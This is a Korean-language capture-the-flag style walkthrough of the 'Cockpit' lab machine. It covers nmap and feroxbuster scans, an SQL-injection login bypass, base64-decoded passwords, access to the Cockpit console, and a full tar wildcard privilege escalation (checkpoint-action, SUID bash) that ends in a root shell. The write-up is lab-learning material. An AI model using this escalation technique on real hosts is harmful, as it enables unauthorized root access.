Nmap
```bash
┌──(kali㉿kali)-[~/PG/Cockpit]
└─$ cat nmap.log
# Nmap 7.98 scan initiated Thu Jun 25 10:22:34 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.150.10
Nmap scan report for 192.168.150.10
Host is up (0.067s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: blaze
9090/tcp open  http    Cockpit web service 198 - 220
|_http-title: Did not follow redirect to https://192.168.150.10:9090/
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   66.80 ms 192.168.45.1
2   66.76 ms 192.168.45.254
3   67.04 ms 192.168.251.1
4   67.18 ms 192.168.150.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 25 10:23:32 2026 -- 1 IP address (1 host up) scanned in 58.40 seconds
```


feroxbuster 실행하여 `192.168.161.10/login.php` 확보
```bash
┌──(kali㉿kali)-[~/PG/Cockpit]
└─$ feroxbuster -u http://192.168.161.10:80/ -s 200 -t 200 -x php,html,txt,bak,zip -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.161.10/
 🚩  In-Scope Url          │ 192.168.161.10
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, bak, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      707l     4190w   598838c http://192.168.161.10/img/blaze.png
200      GET       65l      128w     1108c http://192.168.161.10/css/style.css
200      GET       28l       63w      769c http://192.168.161.10/login.php
200      GET      278l      506w     5366c http://192.168.161.10/css/index.css
200      GET       78l      321w     3349c http://192.168.161.10/
200      GET       29l       60w      477c http://192.168.161.10/css/type.css
200      GET       29l       85w      913c http://192.168.161.10/js/index.js
```


로그인 페이지에 임의의 값 입력 시 유저목록 출력
![[Pasted image 20260626105312.png]]![[Pasted image 20260626105320.png]]

`'` 싱글쿼터 입력 시 에러 발생
![[Pasted image 20260626105549.png]]

위에서 획득한 패스워드를 base64 디코딩
`canttouchhhthiss@455152`,`thisscanttbetouchedd@455152`, 
![[Pasted image 20260626110833.png]]

획득한 자격증명으로 9090 포트에 있는 cockfit 로그인인
![[Pasted image 20260626111116.png]]

터미널 메뉴를 활용하여 flag획득
![[Pasted image 20260626111320.png]]

sudo -l 로 tar 권한 있는 것을 확인
![[Pasted image 20260626130129.png]]

권한상승 페이로드 작성

```bash
james@blaze:~$ cd /tmp
james@blaze:/tmp$ echo 'chmod +s /bin/bash' > privesc.sh
james@blaze:/tmp$ touch -- '--checkpoint=1'
james@blaze:/tmp$ touch -- '--checkpoint-action=exec=sh privesc.sh'
james@blaze:/tmp$ sudo tar -czvf /tmp/backup.tar.gz *
privesc.sh
snap-private-tmp/
snap-private-tmp/snap.lxd/
snap-private-tmp/snap.lxd/tmp/
ssh-MMae8vAufv2u/
tar: ssh-MMae8vAufv2u/agent.2081: socket ignored
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-apache2.service-Pqb66f/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-apache2.service-Pqb66f/tmp/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-fwupd.service-iFThWh/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-fwupd.service-iFThWh/tmp/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-ModemManager.service-l1tS1f/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-ModemManager.service-l1tS1f/tmp/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-logind.service-0vp5Lh/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-logind.service-0vp5Lh/tmp/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-resolved.service-pGOwNf/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-resolved.service-pGOwNf/tmp/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-timedated.service-bNWBoh/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-timedated.service-bNWBoh/tmp/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-timesyncd.service-Ll8SPh/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-timesyncd.service-Ll8SPh/tmp/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-upower.service-tieolh/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-upower.service-tieolh/tmp/
vmware-root_750-2957714542/
james@blaze:/tmp$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# 
```

root 획득 후 flag 확인
![[Pasted image 20260626135233.png]]